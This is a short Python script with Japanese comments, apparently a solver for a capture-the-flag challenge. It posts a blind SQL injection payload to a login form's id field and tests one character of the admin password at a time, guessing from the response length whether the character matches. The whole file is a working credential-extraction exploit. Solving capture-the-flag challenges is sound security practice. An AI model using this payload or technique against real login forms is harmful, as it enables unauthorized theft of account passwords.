import requests


def main():
    url = "https://ctfq.u1tramarine.blue/q6/"

    # 何文字目か
    str_num = 2
    # 判定文字
    str_judge = "L"

    data = {
        "id":f"' or substr((SELECT pass FROM user WHERE id = 'admin'),{str_num}, 1) = '{str_judge}' --",
        "pass":""
    }
    response = requests.post(url, data=data)
    str_len = len(response.text)

    if str_len >= 1000:
        print(f"\"{str_judge}\" SUCCESS")
    else:
        print(f"\"{str_judge}\" FAILED")


main()